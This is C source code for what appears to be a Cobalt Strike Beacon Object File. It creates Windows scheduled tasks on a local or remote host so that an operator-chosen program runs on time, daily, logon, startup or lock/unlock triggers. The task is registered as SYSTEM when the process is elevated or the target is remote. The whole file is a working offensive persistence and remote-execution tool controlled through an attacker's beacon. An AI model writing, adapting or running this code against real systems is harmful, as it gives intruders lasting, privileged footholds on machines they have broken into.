#include <taskschd.h>
#include "addtaskscheduler.h"

BOOL IsElevated(VOID)
{
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;

    TOKEN_ELEVATION elevation;
    DWORD dwSize;

    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        if (ADVAPI32$GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
        {
            fIsElevated = elevation.TokenIsElevated;
        }
    }

    if (hToken)
    {
        KERNEL32$CloseHandle(hToken);
    }

    return fIsElevated;
}

/// @brief Placeholder function for task trigger types
/// @param pITrigger IUnknown* Generic trigger
/// @param config TaskConfig* containing task configurations
/// @return E_NOTIMPL
HRESULT HandleNotImplemented(IUnknown* pITrigger, const TaskConfig* config)
{
    return E_NOTIMPL;
}

/// @brief Sets configurations for "onetime" task
/// @param pITrigger IUnknown* Generic trigger
/// @param config TaskConfig* containing task configurations
/// @return HRESULT
HRESULT HandleTimeTask(IUnknown* pITrigger, const TaskConfig* config)
{
    HRESULT hr;
    ITimeTrigger* pITimeTrigger = (ITimeTrigger*)pITrigger;
    IRepetitionPattern* pRepetitionPattern = NULL;

    BSTR bstrStartTime  = OLEAUT32$SysAllocString(config->wszStartTime);
    BSTR bstrRepeatTask = OLEAUT32$SysAllocString(config->wszRepeatTask); 
    BSTR bstrDuration   = OLEAUT32$SysAllocString(L"");  // Indefinite duration

    HR_CHECK(pITimeTrigger->lpVtbl->put_StartBoundary(pITimeTrigger, bstrStartTime));
    HR_CHECK(pITimeTrigger->lpVtbl->get_Repetition(pITimeTrigger, &pRepetitionPattern));
    HR_CHECK(pRepetitionPattern->lpVtbl->put_Interval(pRepetitionPattern, bstrRepeatTask));
    HR_CHECK(pRepetitionPattern->lpVtbl->put_Duration(pRepetitionPattern, bstrDuration));
       
cleanup:
    SAFE_SYSFREE_STRING(bstrStartTime);
    SAFE_SYSFREE_STRING(bstrRepeatTask);
    SAFE_SYSFREE_STRING(bstrDuration);
    
    SAFE_INTERFACE_RELEASE(pRepetitionPattern);

    return hr;
}

/// @brief Sets configurations for "daily" task
/// @param pITrigger IUnknown* Generic trigger
/// @param config TaskConfig* containing task configurations
/// @return HRESULT
HRESULT HandleDailyTask(IUnknown* pITrigger, const TaskConfig* config)
{
    HRESULT hr;
    IDailyTrigger* pIDailyTrigger = (IDailyTrigger*)pITrigger;
    
    BSTR bstrStartTime  = OLEAUT32$SysAllocString(config->wszStartTime);
    BSTR bstrExpireTime = OLEAUT32$SysAllocString(config->wszExpireTime);
    BSTR bstrDelay      = OLEAUT32$SysAllocString(config->wszDelay);

    HR_CHECK(pIDailyTrigger->lpVtbl->put_StartBoundary(pIDailyTrigger, bstrStartTime));
    HR_CHECK(pIDailyTrigger->lpVtbl->put_EndBoundary(pIDailyTrigger, bstrExpireTime));
    HR_CHECK(pIDailyTrigger->lpVtbl->put_DaysInterval(pIDailyTrigger, config->daysInterval));
    HR_CHECK(pIDailyTrigger->lpVtbl->put_RandomDelay(pIDailyTrigger, bstrDelay));

cleanup:
    SAFE_SYSFREE_STRING(bstrStartTime);
    SAFE_SYSFREE_STRING(bstrExpireTime);
    SAFE_SYSFREE_STRING(bstrDelay);
    
    return hr;
}

/// @brief Sets configurations for "logon" task
/// @param pITrigger IUnknown* Generic trigger
/// @param config TaskConfig* containing task configurations
/// @return HRESULT
HRESULT HandleLogonTask(IUnknown* pITrigger, const TaskConfig* config)
{
    HRESULT hr;
    ILogonTrigger* pILogonTrigger = (ILogonTrigger*)pITrigger;

    BSTR bstrUserId = OLEAUT32$SysAllocString(config->wszUserId);
            
    HR_CHECK(pILogonTrigger->lpVtbl->put_UserId(pILogonTrigger, bstrUserId)); 
            
cleanup:
    SAFE_SYSFREE_STRING(bstrUserId);

    return hr;
}

/// @brief Sets configurations for "startup" task
/// @param pITrigger IUnknown* Generic trigger
/// @param config TaskConfig* containing task configurations
/// @return HRESULT
HRESULT HandleBootTask(IUnknown* pITrigger, const TaskConfig* config)
{
    HRESULT hr;
    IBootTrigger* pIBootTrigger = (IBootTrigger*)pITrigger;

    BSTR bstrDelay = OLEAUT32$SysAllocString(config->wszDelay);

    HR_CHECK(pIBootTrigger->lpVtbl->put_Delay(pIBootTrigger, bstrDelay));

cleanup:
    SAFE_SYSFREE_STRING(bstrDelay);
    
    return hr;
}

/// @brief Sets configurations for "lock/unlock" task
/// @param pITrigger IUnknown* Generic trigger
/// @param config TaskConfig* containing task configurations
/// @return HRESULT
HRESULT HandleStateChangeTask(IUnknown* pITrigger, const TaskConfig* config)
{
    HRESULT hr;
    ISessionStateChangeTrigger* pIStateChangeTrigger = (ISessionStateChangeTrigger*)pITrigger;

    BSTR bstrUserId = OLEAUT32$SysAllocString(config->wszUserId);
    BSTR bstrDelay  = OLEAUT32$SysAllocString(config->wszDelay);
    
    HR_CHECK(pIStateChangeTrigger->lpVtbl->put_StateChange(pIStateChangeTrigger, config->changeType));
    HR_CHECK(pIStateChangeTrigger->lpVtbl->put_UserId(pIStateChangeTrigger, bstrUserId));
    HR_CHECK(pIStateChangeTrigger->lpVtbl->put_Delay(pIStateChangeTrigger, bstrDelay));

cleanup:
    SAFE_SYSFREE_STRING(bstrUserId);
    SAFE_SYSFREE_STRING(bstrDelay);

    return hr;
}

/// @brief Dispatches task configuration to the appropriate function
/// @param pTriggerCollection ITriggerCollection* 
/// @param config TaskConfig* containing task configurations
/// @return HRESULT
HRESULT ConfigureTask(ITriggerCollection* pTriggerCollection, const TaskConfig* config)
{
	HRESULT hr;
    ITrigger* pITrigger = NULL;
    IUnknown* pIFace = NULL;
    
    HR_CHECK(pTriggerCollection->lpVtbl->Create(pTriggerCollection, config->triggerType, &pITrigger));

    HR_CHECK(pITrigger->lpVtbl->QueryInterface(pITrigger, &(task_lookup[config->triggerType]), (VOID**)&pIFace));

    if (config->triggerType == TASK_TRIGGER_EVENT)
    {
        HR_CHECK(HandleNotImplemented(pIFace, config));
    }
    else if (config->triggerType == TASK_TRIGGER_TIME)
    {
        HR_CHECK(HandleTimeTask(pIFace, config));
    }
    else if (config->triggerType == TASK_TRIGGER_DAILY)
    {
        HR_CHECK(HandleDailyTask(pIFace, config));
    }
    else if (config->triggerType == TASK_TRIGGER_WEEKLY)
    {
        HR_CHECK(HandleNotImplemented(pIFace, config));
    }
    else if (config->triggerType == TASK_TRIGGER_MONTHLY)
    {
        HR_CHECK(HandleNotImplemented(pIFace, config));
    }
    else if (config->triggerType == TASK_TRIGGER_MONTHLYDOW)
    {
        HR_CHECK(HandleNotImplemented(pIFace, config));
    }
    else if (config->triggerType == TASK_TRIGGER_IDLE)
    {
        HR_CHECK(HandleNotImplemented(pIFace, config));
    }
    else if (config->triggerType == TASK_TRIGGER_REGISTRATION)
    {
        HR_CHECK(HandleNotImplemented(pIFace, config));
    }
    else if (config->triggerType == TASK_TRIGGER_BOOT)
    {
        HR_CHECK(HandleBootTask(pIFace, config));
    }
    else if (config->triggerType == TASK_TRIGGER_LOGON)
    {
        HR_CHECK(HandleLogonTask(pIFace, config));
    }
    else if (config->triggerType == TASK_TRIGGER_SESSION_STATE_CHANGE)
    {
        HR_CHECK(HandleStateChangeTask(pIFace, config));
    }
    else
    {
        hr = E_NOTIMPL;
    }

cleanup:
    SAFE_INTERFACE_RELEASE(pITrigger);
    SAFE_INTERFACE_RELEASE(pIFace);

    return hr;
}

HRESULT CreateScheduledTask(const TaskConfig* config)                        
{
	HRESULT hr = S_OK;
    BOOL bComInitialized = FALSE;

    IID CTaskScheduler  = IID_TASK_SCHEDULER;
    IID IIDIExecAction  = IID_IEXEC_ACTION;
    IID IIDITaskService = IID_ITASK_SERVICE;

    IAction* pAction                       = NULL;
    IActionCollection* pActionCollection   = NULL;
    IExecAction* pExecAction               = NULL;
    IPrincipal* pPrincipal                 = NULL;
    IRegisteredTask* pRegisteredTask       = NULL;
    ITaskDefinition* pTaskDefinition       = NULL;
    ITaskFolder* pTaskFolder               = NULL;
    ITaskService* pTaskService             = NULL;
    ITriggerCollection* pTriggerCollection = NULL;

	BSTR bstrFolderPath  = OLEAUT32$SysAllocString(L"\\");
    BSTR bstrProgramArgs = OLEAUT32$SysAllocString(config->wszProgramArgs);
    BSTR bstrProgramPath = OLEAUT32$SysAllocString(config->wszProgramPath);
    BSTR bstrSystemUser  = OLEAUT32$SysAllocString(L"SYSTEM");

    VARIANT vHost;
	VARIANT vNULL;

    OLEAUT32$VariantInit(&vHost);
	OLEAUT32$VariantInit(&vNULL);

	vHost.vt = VT_BSTR;
	vHost.bstrVal = OLEAUT32$SysAllocString(config->wszHostName);

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    switch (hr)
    {
        case S_OK:
            // Thread owns COM initialization
        case S_FALSE:
            // COM exists with the same apartment(MTA) reference count incremented
            // Must call CoUnintialize()
            bComInitialized = TRUE;
        case RPC_E_CHANGED_MODE:
            // Already initialized with a different apartment.
            // Continue using existing apartment.
            // do not call CoUninitialize()
            break;
        default:
            goto cleanup;
    }

    HR_CHECK(OLE32$CoCreateInstance(&CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IIDITaskService, (void**)&pTaskService));
    
    HR_CHECK(pTaskService->lpVtbl->Connect(pTaskService, vHost, vNULL, vNULL, vNULL));
    
    HR_CHECK(pTaskService->lpVtbl->GetFolder(pTaskService, bstrFolderPath, &pTaskFolder));
	
    HR_CHECK(pTaskService->lpVtbl->NewTask(pTaskService, 0, &pTaskDefinition));
    
	hr = pTaskDefinition->lpVtbl->get_Principal(pTaskDefinition, &pPrincipal);
	if (SUCCEEDED(hr))
    {
        // USE THIS LINE INSTEAD OF THE BELOW "If statement" IF ENCOUNTERING 
        // ERROR CODE: 80041310 (SYSTEM security option is not set correctly and remains NULL)
		// pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN); 
		
        // Elevated or remote host
		if (IsElevated() || (vHost.bstrVal && *vHost.bstrVal))
        {
            // TODO: line necessary?
			// BeaconPrintf(CALLBACK_OUTPUT, "[*] Running in elevated context and setting \"Run whether user is logged on or not\" security option as SYSTEM!\n"); 
			HR_CHECK(pPrincipal->lpVtbl->put_UserId(pPrincipal, bstrSystemUser));
		}
        else
        {
            HR_CHECK(pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN));
		}
	}

    HR_CHECK(pTaskDefinition->lpVtbl->get_Triggers(pTaskDefinition, &pTriggerCollection));
    
    HR_CHECK(ConfigureTask(pTriggerCollection, config));

    HR_CHECK(pTaskDefinition->lpVtbl->get_Actions(pTaskDefinition, &pActionCollection));
	
    HR_CHECK(pActionCollection->lpVtbl->Create(pActionCollection, TASK_ACTION_EXEC, &pAction));
	
    HR_CHECK(pAction->lpVtbl->QueryInterface(pAction, &IIDIExecAction, (void**)&pExecAction));
	
    HR_CHECK(pExecAction->lpVtbl->put_Path(pExecAction, bstrProgramPath));
	
    HR_CHECK(pExecAction->lpVtbl->put_Arguments(pExecAction, bstrProgramArgs));

    HR_CHECK(
        pTaskFolder->lpVtbl->RegisterTaskDefinition(
            pTaskFolder,
            config->wszTaskName,
            pTaskDefinition,
            TASK_CREATE_OR_UPDATE,
            vNULL,
            vNULL,
            TASK_LOGON_INTERACTIVE_TOKEN,
            vNULL,
            &pRegisteredTask)
    );

cleanup:
    SAFE_SYSFREE_STRING(bstrFolderPath);
    SAFE_SYSFREE_STRING(bstrProgramArgs);
    SAFE_SYSFREE_STRING(bstrProgramPath);
    SAFE_SYSFREE_STRING(bstrSystemUser);

    SAFE_INTERFACE_RELEASE(pAction);
    SAFE_INTERFACE_RELEASE(pActionCollection);
    SAFE_INTERFACE_RELEASE(pExecAction);
    SAFE_INTERFACE_RELEASE(pPrincipal);
    SAFE_INTERFACE_RELEASE(pRegisteredTask);
    SAFE_INTERFACE_RELEASE(pTaskDefinition);
    SAFE_INTERFACE_RELEASE(pTaskFolder);
    SAFE_INTERFACE_RELEASE(pTaskService);
    SAFE_INTERFACE_RELEASE(pTriggerCollection);

    OLEAUT32$VariantClear(&vHost);
    OLEAUT32$VariantClear(&vNULL);

    if (bComInitialized)
        OLE32$CoUninitialize();

	return hr;
}

int go(char *args, int len)
{
    HRESULT hr;
	datap parser;
	
	PCHAR triggerType; 
    TaskConfig config = {0};

	BeaconDataParse(&parser, args, len);

	config.wszTaskName    = BeaconDataExtract(&parser, NULL);
	config.wszHostName    = BeaconDataExtract(&parser, NULL);
	config.wszProgramPath = BeaconDataExtract(&parser, NULL);
	config.wszProgramArgs = BeaconDataExtract(&parser, NULL);

	triggerType = BeaconDataExtract(&parser, NULL);

	if (MSVCRT$strcmp(triggerType, "onetime") == 0)
    {
        config.triggerType = TASK_TRIGGER_TIME;
		
        config.wszStartTime  = BeaconDataExtract(&parser, NULL);
		config.wszRepeatTask = BeaconDataExtract(&parser, NULL);
	} 
	else if (MSVCRT$strcmp(triggerType, "daily") == 0)
    {
        config.triggerType = TASK_TRIGGER_DAILY;

		config.wszStartTime  = BeaconDataExtract(&parser, NULL);
		config.wszExpireTime = BeaconDataExtract(&parser, NULL);
		config.daysInterval  = BeaconDataInt(&parser);
		config.wszDelay      = BeaconDataExtract(&parser, NULL);
	} 
	else if (MSVCRT$strcmp(triggerType, "logon") == 0)
    {
        config.triggerType = TASK_TRIGGER_LOGON;

		config.wszUserId = BeaconDataExtract(&parser, NULL);
	} 
	else if (MSVCRT$strcmp(triggerType, "startup") == 0)
    {
        config.triggerType = TASK_TRIGGER_BOOT;

		config.wszDelay = BeaconDataExtract(&parser, NULL);
	}
	else if (MSVCRT$strcmp(triggerType, "lock") == 0)
    {
        config.triggerType = TASK_TRIGGER_SESSION_STATE_CHANGE;
        config.changeType  = TASK_SESSION_LOCK;

		config.wszUserId = BeaconDataExtract(&parser, NULL);
		config.wszDelay  = BeaconDataExtract(&parser, NULL);
	} 
	else if (MSVCRT$strcmp(triggerType, "unlock") == 0)
    {
        config.triggerType = TASK_TRIGGER_SESSION_STATE_CHANGE;
        config.changeType  = TASK_SESSION_UNLOCK;

		config.wszUserId = BeaconDataExtract(&parser, NULL);
		config.wszDelay  = BeaconDataExtract(&parser, NULL);
	}
	else
    {
		BeaconPrintf(CALLBACK_ERROR, "Specified trigger type is not supported: %s\n", triggerType);
        return 1;
	}

    hr = CreateScheduledTask(&config);

    if (hr == E_NOTIMPL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Fail: Attempted to create a task with an unimplemented handler\n");
    }
    else if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to register the scheduled task with error code: %x\n", hr);
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Scheduled task '%ls' created successfully!\n", config.wszTaskName);
    }

    return 0;
}
